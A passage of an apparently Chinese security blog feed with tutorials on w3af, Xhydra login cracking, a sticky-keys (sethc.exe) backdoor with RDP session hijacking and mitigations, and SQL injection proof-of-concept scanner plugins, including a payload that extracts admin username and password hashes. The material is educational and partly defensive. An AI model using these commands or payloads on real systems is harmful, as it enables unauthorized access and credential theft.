<p>audit<br>可以在audit中看到Status为Enabled<br><img src="/upload_img/W3af_11.png" alt=""><br>如果带上desc命令，还会显示这个插件的详细信息<br><img src="/upload_img/W3af_12.png" alt=""><br>保存配置：<br>配置好了插件和框架配置就可以将配置保存在配置文件中<br><img src="/upload_img/W3af_13.png" alt=""></p>
<h3 id="开始扫描"><a href="#开始扫描" class="headerlink" title="开始扫描"></a>开始扫描</h3><p>配置插件——常规扫描的话，我们建议使用以下的配置运行w3af：<br>crawl类插件使用web_spider插件<br>audit 类插件设置成Enable all<br>grep类插件设置成Enable all<br>配置命令如下：<br><img src="/upload_img/W3af_14.png" alt=""><br>输出扫描报告——output<br>不设置默认只会在console上输出扫描信息。<br>一般我们再加上输出csv_file（表格）和html_fiel（网页）两种格式的扫描报告<br><img src="/upload_img/W3af_15.png" alt=""><br>扫描报告默认会保存在/root目录下，你可以使用out config命令去设置。<br>保存配置——profiles<br><img src="/upload_img/W3af_16.png" alt=""><br>设置目标，开始扫描——target，start<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">w3af&gt;&gt;&gt; target</div><div class="line">w3af/config:target&gt;&gt;&gt; set target http://ip/</div><div class="line">w3af/config:target&gt;&gt;&gt; back</div><div class="line">w3af&gt;&gt;&gt; start</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;W3af是一个基于Python的Web应用扫描器,在之前的版本中有windows的版本，但是在最新的版本中windows不再更新，如果想要安装windows版本，下面有链接：&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://y-hkl.top/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="工具" scheme="http://y-hkl.top/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Xhydra使用教程</title>
    <link href="http://y-hkl.top/2017/11/28/Xhydra%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
    <id>http://y-hkl.top/2017/11/28/Xhydra使用教程/</id>
    <published>2017-11-29T02:55:07.000Z</published>
    <updated>2017-11-29T03:10:27.596Z</updated>
    
    <content type="html"><![CDATA[<p>THC-HYDRA是一个支持多种网络服务的非常快速的网络登陆破解工具。这个工具是一个验证性质的工具，它被设计的主要目的是为研究人员和安全从业人员展示远程获取一个系统的认证权限是比较容易的！并且支持多种协议和服务：<br>asterisk cisco cisco-enable cvs firebird ftp ftps http[s]-{head|get} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres rdp redis rexec rlogin rsh s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey teamspeak telnet[s] vmauthd vnc xmpp<br>而新的版本中出现了图形化的界面Xydra，下面介绍的就是它的图形化界面的使用<br><a id="more"></a></p>
<h2 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h2><p><img src="/upload_img/Xhydra_1.png" alt=""><br><img src="/upload_img/Xhydra_2.png" alt=""><br><img src="/upload_img/Xhydra_3.png" alt=""><br><img src="/upload_img/Xhydra_4.png" alt=""><br><img src="/upload_img/Xhydra_5.png" alt=""></p>
<h2 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h2><p>1 当kali-linux 主机被防火墙挡住了，可以考虑断网重新获取IP<br>2 将“ Tunning “ 中的 ” Number of  Task “ 的数目设置成小数目，例如2或者3<br>3 主界面底栏有具体的命令，当我们设置完具体参数后，底栏将会显示具体的执行命令。这时，在终端中输入 该命令，以命令行的形式执行。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;THC-HYDRA是一个支持多种网络服务的非常快速的网络登陆破解工具。这个工具是一个验证性质的工具，它被设计的主要目的是为研究人员和安全从业人员展示远程获取一个系统的认证权限是比较容易的！并且支持多种协议和服务：&lt;br&gt;asterisk cisco cisco-enable cvs firebird ftp ftps http[s]-{head|get} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres rdp redis rexec rlogin rsh s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey teamspeak telnet[s] vmauthd vnc xmpp&lt;br&gt;而新的版本中出现了图形化的界面Xydra，下面介绍的就是它的图形化界面的使用&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://y-hkl.top/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="工具" scheme="http://y-hkl.top/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>通过shift快捷键运行后门</title>
    <link href="http://y-hkl.top/2017/10/09/%E9%80%9A%E8%BF%87shift%E5%BF%AB%E6%8D%B7%E9%94%AE%E8%BF%90%E8%A1%8C%E5%90%8E%E9%97%A8/"/>
    <id>http://y-hkl.top/2017/10/09/通过shift快捷键运行后门/</id>
    <published>2017-10-09T08:12:40.000Z</published>
    <updated>2017-10-09T08:50:12.228Z</updated>
    
    <content type="html"><![CDATA[<p>我们都知道，windows系统按5下shift后，windows就执行了system32下的sethc.exe，也就是启用了粘滞键。虽然快捷方便，但却存在安全隐患。<br><a id="more"></a></p>
<h2 id="创建shift快捷键后门"><a href="#创建shift快捷键后门" class="headerlink" title="创建shift快捷键后门"></a>创建shift快捷键后门</h2><p>将我们的cmd.exe或者木马后门名字改成sethc.exe，然后替换C:windows\system32\sethc.exe程序<br>命令：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">copy C:\WINDOWS\system32\cmd.exe C:\WINDOWS\system32\sethc.exe /Y</div></pre></td></tr></table></figure></p>
<h2 id="测试是否成功"><a href="#测试是否成功" class="headerlink" title="测试是否成功"></a>测试是否成功</h2><p>使用远程连接，按5下shift键可以调出cmd命令窗口，还可以添加账户：<br><img src="/upload_img/后门-1.png" alt=""><br>使用net user可以查看是否添加成功。<br><img src="/upload_img/后门-2.png" alt=""><br>使用命令添加到管理员组<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">net localgroup administrators test /add</div></pre></td></tr></table></figure></p>
<p>然后就可以使用创建的用户登录了</p>
<h2 id="远程桌面会话劫持登录主机"><a href="#远程桌面会话劫持登录主机" class="headerlink" title="远程桌面会话劫持登录主机"></a>远程桌面会话劫持登录主机</h2><p>结合query和tscon命令达到会话劫持目的<br>query user查询所有已登录的用户会话信息<br>tscon 会话ID切换到目标会话状态<br><img src="/upload_img/后门-3.png" alt=""><br>回车之后可直接切换成目标用户登录系统。</p>
<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>方案一：删除sethc.exe程序所有用户运行权限<br><img src="/upload_img/后门-4.png" alt=""><br><img src="/upload_img/后门-5.png" alt=""><br><img src="/upload_img/后门-6.png" alt=""><br>接下来就无法使用粘滞键快捷键了，另外提醒一下，直接删除sethc.exe是没用的，系统还会自动找回。<br>方法二：添加一个everyone用户组，然后权限选择拒绝所有<br><img src="/upload_img/后门-7.png" alt=""><br>方案三：禁用shift快捷键<br><img src="/upload_img/后门-8.png" alt=""><br><img src="/upload_img/后门-9.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我们都知道，windows系统按5下shift后，windows就执行了system32下的sethc.exe，也就是启用了粘滞键。虽然快捷方便，但却存在安全隐患。&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://y-hkl.top/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="后门" scheme="http://y-hkl.top/tags/%E5%90%8E%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>基于报错布尔时间的SQL注入POC编写</title>
    <link href="http://y-hkl.top/2017/09/16/%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E5%B8%83%E5%B0%94%E6%97%B6%E9%97%B4%E7%9A%84SQL%E6%B3%A8%E5%85%A5POC%E7%BC%96%E5%86%99/"/>
    <id>http://y-hkl.top/2017/09/16/基于报错布尔时间的SQL注入POC编写/</id>
    <published>2017-09-17T03:14:11.000Z</published>
    <updated>2017-09-17T03:32:36.400Z</updated>
    
    <content type="html"><![CDATA[<p>下面的文章写出了SQL注入的报错，布尔，时间注入的POC，通过这三个POC的编写来进入编写POC的入门。<br><a id="more"></a></p>
<h2 id="基于报错的-SQL-注入-PoC-编写"><a href="#基于报错的-SQL-注入-PoC-编写" class="headerlink" title="基于报错的 SQL 注入 PoC 编写"></a>基于报错的 SQL 注入 PoC 编写</h2><p>选择的漏洞为CmsEasy最新版5.5_UTF-8_20140802多处SQL注入 ：<a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2014-070827.html" target="_blank" rel="external">http://wooyun.jozxing.cc/static/bugs/wooyun-2014-070827.html</a></p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞分析在原文已经说的很详细了，大可以回原文查看。<br>我们在编写 PoC 的时候，如果原文中已经给出了具体的利用办法，我们就无需再关注整个漏洞的成因和原理，我们只用看这个漏洞的复现方式。<br>阅读原文后我们得到了 payload 和 目标 URL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">请求的链接：</div><div class="line">http://xxx.com/celive/live/header.php</div><div class="line">POST 数据内容：</div><div class="line">xajax=LiveMessage&amp;xajaxargs[0][name]=1&apos;,(SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(select concat(username,0x23,password) from cmseasy_user where groupid=2 limit 1))a from information_schema.tables group by a)b),&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;1&apos;,&apos;127.0.0.1&apos;,&apos;2&apos;)#</div></pre></td></tr></table></figure></p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>实验所需要 CMS 的下载地址: <a href="http://pan.baidu.com/s/1i4lAwBF" target="_blank" rel="external">http://pan.baidu.com/s/1i4lAwBF</a><br>安装完毕后，我们就可以进行手工复现利用过程了</p>
<h3 id="基于-Bugscan-框架编写POC"><a href="#基于-Bugscan-框架编写POC" class="headerlink" title="基于 Bugscan 框架编写POC"></a>基于 Bugscan 框架编写POC</h3><p>Bugscan 框架要求所有的逻辑代码都必须是基于 Python 2.7 的标准库的，所以像 requests 这种第三方库就不能在这里使用了<br>Bugscan配置环境：<a href="http://doc.bugscan.net/chapter1/1-1.html" target="_blank" rel="external">http://doc.bugscan.net/chapter1/1-1.html</a><br>代码编写<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> urllib</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">assign</span><span class="params">(service, arg)</span>:</span></div><div class="line">    <span class="keyword">if</span> service == <span class="string">"cmseasy"</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">True</span>, arg</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">audit</span><span class="params">(arg)</span>:</span></div><div class="line">    target = arg + <span class="string">'/celive/live/header.php'</span></div><div class="line">    post_data = &#123;</div><div class="line">        <span class="string">'xajax'</span>: <span class="string">'LiveMessage'</span>,</div><div class="line">        <span class="string">'xajaxargs[0][name]'</span>: <span class="string">"1',(SELECT 1 FROM (select count(*),concat("</span></div><div class="line">                              <span class="string">"floor(rand(0)*2),(select md5(233)))a from "</span></div><div class="line">                              <span class="string">"information_schema.tables group by a)b),"</span></div><div class="line">                              <span class="string">"'','','','1','127.0.0.1','2') #"</span></div><div class="line">    &#125;</div><div class="line">    code, head, body, errcode, redirect_url = curl.curl2(</div><div class="line">        target, post=urllib.urlencode(post_data))</div><div class="line">    <span class="keyword">if</span> <span class="string">'e165421110ba03099a1c0393373c5b43'</span> <span class="keyword">in</span> body:</div><div class="line">        security_hole(target)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">from</span> dummy <span class="keyword">import</span> *</div><div class="line">    audit(assign(<span class="string">'cmseasy'</span>, <span class="string">'http://localhost/cmseasy/'</span>)[<span class="number">1</span>])</div></pre></td></tr></table></figure></p>
<h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>整体结构就像上面说的那样，最上面，是引入自己要用到的标准库，assign 就是任务分配函数，是来判断本次扫描任务是否可以调用这个 PoC 的， audit 就是整个验证逻辑的入口了，最下面的 if name == ‘main’: 这段代码是为了让你在本地测试用的。</p>
<h2 id="基于布尔的盲注的-SQL-注入-PoC-编写"><a href="#基于布尔的盲注的-SQL-注入-PoC-编写" class="headerlink" title="基于布尔的盲注的 SQL 注入 PoC 编写"></a>基于布尔的盲注的 SQL 注入 PoC 编写</h2><p>选择漏洞为Sqli labs Less-5</p>
<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>目标URL <a href="http://127.0.0.1/sqli/Less-5/index.php?id=1" target="_blank" rel="external">http://127.0.0.1/sqli/Less-5/index.php?id=1</a><br>存在注入的参数是 id，由于sql 语句执行的选择后，选择的数据不能回显到前端页面，所以注入的类型是 Boolean-Based Blind</p>
<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>请求的SQL语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1</div></pre></td></tr></table></figure></p>
<p>构造语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">返回正确的语句 http://127.0.0.1/sqli/Less-5/index.php?id=1&apos; and 4343=4343%23</div><div class="line">返回不正确的语句  http://127.0.0.1/sqli/Less-5/index.php?id=1&apos; and 4343=4342%23</div></pre></td></tr></table></figure></p>
<p>对比两个 Payload, 发现唯一的差别就是 4343=4343 和 4343=4342 了,当然这里的这个数字嘛，随便写的<br>访问上面两个链接之后发现，第一个请求的响应页面中You are in………..，而第二个请求的响应页面中没有</p>
<h3 id="基于-Bugscan-框架的扫描插件编写"><a href="#基于-Bugscan-框架的扫描插件编写" class="headerlink" title="基于 Bugscan 框架的扫描插件编写"></a>基于 Bugscan 框架的扫描插件编写</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">assign</span><span class="params">(service, arg)</span>:</span></div><div class="line">    <span class="keyword">if</span> service == fingerprint.sqli:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">True</span>, arg</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">audit</span><span class="params">(arg)</span>:</span></div><div class="line">    <span class="comment"># 开发者可调用自定义函数</span></div><div class="line">    verify(arg)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span><span class="params">(url)</span>:</span></div><div class="line">    payloadtrue = <span class="string">"&#123;target&#125;/index.php?id=1%27%20and%201=1%23"</span>.format(target=url)</div><div class="line"></div><div class="line">    payloadfalse = <span class="string">"&#123;target&#125;/index.php?id=1%27%20and%201=2%23"</span>.format(target=url)</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        code1, head1, body1, redirect_url1, log1 = hackhttp.http(payloadtrue)</div><div class="line">        </div><div class="line">        <span class="keyword">if</span> code1 != <span class="number">200</span> <span class="keyword">or</span> <span class="keyword">not</span>\</div><div class="line">                re.search(<span class="string">'You are in'</span>, body1, re.M):</div><div class="line">            <span class="keyword">return</span></div><div class="line"></div><div class="line">        code2, head2, body2, redirect_url2, log2 = hackhttp.http(payloadfalse)</div><div class="line">        <span class="keyword">if</span> code2 != <span class="number">200</span> <span class="keyword">or</span>\</div><div class="line">                re.search(<span class="string">'You are in'</span>, body2, re.M):</div><div class="line">            <span class="keyword">return</span></div><div class="line">        security_hole(<span class="string">"%s"</span> % (payloadtrue), log=log1)</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">from</span> dummy <span class="keyword">import</span> *</div><div class="line">    audit(assign(fingerprint.sqli, <span class="string">'http://127.0.0.1/sqli/Less-5'</span>)[<span class="number">1</span>])</div></pre></td></tr></table></figure>
<h2 id="基于时间的盲注的-SQL-注入-PoC-编写"><a href="#基于时间的盲注的-SQL-注入-PoC-编写" class="headerlink" title="基于时间的盲注的 SQL 注入 PoC 编写"></a>基于时间的盲注的 SQL 注入 PoC 编写</h2><p>选择的漏洞为Sqli labs Less-5<br>同一个漏洞有时间我们可以用不同的利用方式</p>
<h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>构造语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">请求链接</div><div class="line">http://xxx.com/sqli/Less-5/index.php?id=1</div><div class="line">get数据内容</div><div class="line">1&apos; and (select if(1=1,sleep(5),1))--+</div></pre></td></tr></table></figure></p>
<p>核心的 SQL 语句是这样的， select if(1=1,sleep(5),1) 熟悉 MySQL 语法的人应该知道这个意思，第一个参数是表达式，就是说如果表达式为真的话，就执行第二个参数位置的语名，在本例子中是 sleep 5秒，如果为假就执行第三个参数位置的语句，本例子中就是返回一个字符 1</p>
<h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">请求链接</div><div class="line">http://127.0.0.1/sqli/Less-5/index.php?id=1</div><div class="line">get数据内容</div><div class="line">1&apos; and (select if(1=1,sleep(5),1))--+</div><div class="line">1&apos; and (select if(1=2,sleep(5),1))--+</div></pre></td></tr></table></figure>
<p>我们打开 Firefox 浏览器，开启 hackbar, 再打开开发者工具，调到网络选项卡，可以看到不同的GET所花费的时间的不同</p>
<h3 id="基于-Bugscan-框架的扫描插件编写-1"><a href="#基于-Bugscan-框架的扫描插件编写-1" class="headerlink" title="基于 Bugscan 框架的扫描插件编写"></a>基于 Bugscan 框架的扫描插件编写</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># coding:utf-8</span></div><div class="line"><span class="keyword">import</span> urllib</div><div class="line"><span class="keyword">import</span> time</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">assign</span><span class="params">(service, arg)</span>:</span></div><div class="line">    <span class="keyword">if</span> service == fingerprint.sqli5:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">True</span>, arg</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">audit</span><span class="params">(arg)</span>:</span></div><div class="line">    target = <span class="string">"%s/celive/live/header.php"</span> % arg</div><div class="line"></div><div class="line">    get_data1 = <span class="string">"&#123;target&#125;/index.php?id=1%27%20and%20(select%20if(1=1,sleep(5),0))--+"</span>.format(target=arg)</div><div class="line">    <span class="comment">#print get_data1</span></div><div class="line">    get_data2 = <span class="string">"&#123;target&#125;/index.php?id=1%27%20and%20(select%20if(1=2,sleep(5),0))--+"</span>.format(target=arg)</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="comment"># 记录开始请求的时间</span></div><div class="line">        start_time = time.time()</div><div class="line">        <span class="comment"># 发送 HTTP 请求</span></div><div class="line">        <span class="comment"># 这里需要注意的是 hackhttp 返回的第 4 个和第 5 个参数</span></div><div class="line">        code1, head1, html1, redirect1, log1 = hackhttp.http(get_data1)</div><div class="line">        <span class="comment"># 记录正常请求并收到响应的时间</span></div><div class="line">        end_time_1 = time.time()</div><div class="line">        code2, head2, html2, redirect2, log2 = hackhttp.http(get_data2)</div><div class="line">        <span class="comment"># 收到响应的时间</span></div><div class="line">        end_time_2 = time.time()</div><div class="line">        <span class="comment"># 计算时间差</span></div><div class="line">        delta1 = end_time_1 - start_time</div><div class="line">        delta2 = end_time_2 - end_time_1</div><div class="line">        <span class="comment">#print delta1</span></div><div class="line">        <span class="comment">#print delta2</span></div><div class="line">        <span class="keyword">if</span> (delta1 - delta2) &gt; <span class="number">4</span>:</div><div class="line">            <span class="comment"># 注意：warning 和 hole 级别必须传递 log</span></div><div class="line">            security_hole(<span class="string">"%s"</span> % (target), log=log1)</div><div class="line">    <span class="keyword">except</span> Exception,e:</div><div class="line">        <span class="keyword">print</span> e</div><div class="line">        <span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">from</span> dummy <span class="keyword">import</span> *</div><div class="line">    audit(assign(fingerprint.sqli5, <span class="string">'http://127.0.0.1/sqli/Less-5'</span>)[<span class="number">1</span>])</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;下面的文章写出了SQL注入的报错，布尔，时间注入的POC，通过这三个POC的编写来进入编写POC的入门。&lt;br&gt;
    
    </summary>
    
      <category term="安全编程" scheme="http://y-hkl.top/categories/%E5%AE%89%E5%85%A8%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="POC" scheme="http://y-hkl.top/tags/POC/"/>
    
      <category term="编程" scheme="http://y-hkl.top/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>POC编写基础知识</title>
    <link href="http://y-hkl.top/2017/09/16/POC%E7%BC%96%E5%86%99%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <id>http://y-hkl.top/2017/09/16/POC编写基础知识/</id>
    <published>2017-09-17T03:07:07.000Z</published>
    <updated>2017-09-17T03:34:49.259Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是-PoC"><a href="#什么是-PoC" class="headerlink" title="什么是 PoC"></a>什么是 PoC</h2><p>PoC(全称: Proof of Concept), 中文译作概念验证。在安全界，你可以理解成为漏洞验证程序,和一些应用程序相比，PoC 是一段不完整的程序，仅仅是为了证明提出者的观点的一段代码</p>
<h2 id="什么是-Exp"><a href="#什么是-Exp" class="headerlink" title="什么是 Exp"></a>什么是 Exp</h2><p>Exp(全称: Exploit),中文叫漏洞利用程序。名字上说的已经很清楚了，简单讲，就是一段可以发挥漏洞价值的程序，这话感觉和没说一样。想象一下这样的场景，目标存在一个 SQL 注入漏洞，然后被你知道了，然后你编写了一个程序，通过这个 SQL 注入漏洞，拿到了目标的权限，那么这个程序就是所谓的 Exp 了.</p>
<h2 id="POC与EXP的区别"><a href="#POC与EXP的区别" class="headerlink" title="POC与EXP的区别"></a>POC与EXP的区别</h2><a id="more"></a>
<p>PoC 和 Exp 是两个东西,PoC 就是用来证明漏洞存在的，而 Exp 是用来利用这个漏洞的，在很多情况下，我们知道了漏洞存在，却不知道具体怎么利用，编写一个 PoC 非常简单，而编写一个 Exp 是相当有挑战性的。</p>
<h2 id="PoC-编写流程"><a href="#PoC-编写流程" class="headerlink" title="PoC 编写流程"></a>PoC 编写流程</h2><h3 id="根据漏洞详情，寻找受影响版本程序"><a href="#根据漏洞详情，寻找受影响版本程序" class="headerlink" title="根据漏洞详情，寻找受影响版本程序"></a>根据漏洞详情，寻找受影响版本程序</h3><p>如果是一些 CMS, 可以去 对应的官网下载历史版本程序,有些漏洞作者不会提具体版本号，那你就要根据漏洞作者提交的时间来判断了。当然除了官方网站之外，还可以去 github 上寻找源码，这些个官网都喜欢把历史版本的程序删除掉，善用 github 上的 tag, branch, release 功能，上面有你要的所有版本</p>
<h3 id="搭建对应漏洞靶场"><a href="#搭建对应漏洞靶场" class="headerlink" title="搭建对应漏洞靶场"></a>搭建对应漏洞靶场</h3><p>这里其实没什么好说的，下载了人家的源码之后，在你的虚拟机里面配置好环境就行了，还能顺便学一下运维的一些皮毛知识。</p>
<h3 id="手动复现漏洞"><a href="#手动复现漏洞" class="headerlink" title="手动复现漏洞"></a>手动复现漏洞</h3><p>根据漏洞详情，手动将整个流程走一遍，熟悉下复现条件，比如使用 GET 还是 POST 请求，需不需要登陆，返回的页面会是什么样子的，我提交不同的参数，会不会出现其它结果，如果漏洞不存在的话，会出现什么样的结果</p>
<h3 id="写代码"><a href="#写代码" class="headerlink" title="写代码"></a>写代码</h3><p>手动复现了一次漏洞之后，分析漏洞证明步骤，根据自己的实际测试情况一步一步写代码，用我的话来说，写代码，其实就是用程序模拟人工操作的每一个步骤，如果你上一步认真做了，这一步只是经验问题<br>编写POC，首推语言当然是Python了，原因很简单——好用，Python提供的强大类库可以让我们将主要精力都放在具体漏洞研究上，而不用去纠结诸如如何去实现HTML解析、HTTP发送等辅助功能。常用到的Python库如下：<br>urllib2: 发送HTTP/HTTPS请求<br>requests:更“高级”的urllib2库<br>re：正则表达式<br>random：生成随机数<br>base64：base64编码<br>hashlib:常用来计算md5值<br>time：用来统计访问时间延迟<br>……<br>当然语言只是工具载体，并不局限于Python。原则上你想用什么语言都可以，建议首选那种外部条件依赖少、简单好用而且自己也比较熟悉的语言</p>
<h3 id="测试-PoC"><a href="#测试-PoC" class="headerlink" title="测试 PoC"></a>测试 PoC</h3><p>其它测试和编码基本都是在同时进行的，为什么要单独提出来讲呢，我们在写 PoC 的时候，除了在存在漏洞的靶机上测试我们的代码，还要在不存在漏洞的站点测试，一般为说，一个优秀的 PoC 在后期测试的时候要求对 10000 个目标测试，误报不能超过 10 个</p>
<h2 id="国内-PoC-框架简介"><a href="#国内-PoC-框架简介" class="headerlink" title="国内 PoC 框架简介"></a>国内 PoC 框架简介</h2><p>POC框架可以对大量POC进行管理与调度，提供了统一的编程规范与接口，是编写POC很好的帮手。我们只需要按照框架自定义的格式写好POC，然后放在框架中运行即可。目前国内有很多非常优秀框架，这里就介绍其中的几款<br>1.Pocsuite<br>Pocsuite框架现为知道创宇Seebug平台通用的漏洞验证框架，使用Python编写POC。可以提交POC换kb，kb可以用来兑换现金，挣点零花钱还是相当不错的。老司机们可能听过Sebug，那是Seebug的前身，2016年Sebug收购了另一个优秀框架Beebeeto后，更名为Seebug<br>github地址：<a href="https://github.com/knownsec/Pocsuite" target="_blank" rel="external">https://github.com/knownsec/Pocsuite</a><br>2.Bugscan<br>Bugscan是四叶草的官方框架，使用Python编写POC。提交POC插件获取rank 奖励，可兑换实物奖励，奖品还是蛮丰富的<br>BugScan SDK：<a href="http://doc.bugscan.net/" target="_blank" rel="external">http://doc.bugscan.net/</a><br>Tangscan<br>Tangscan（唐朝扫描器）是wooyun社区的官方框架，使用Python编写POC。可以提交POC换汤圆，参与现金分红。Tangscan社区已经关闭，不知道还会不会开，里面的汤圆还没取出来呢。<br>github地址：<a href="https://github.com/WooYun/TangScan" target="_blank" 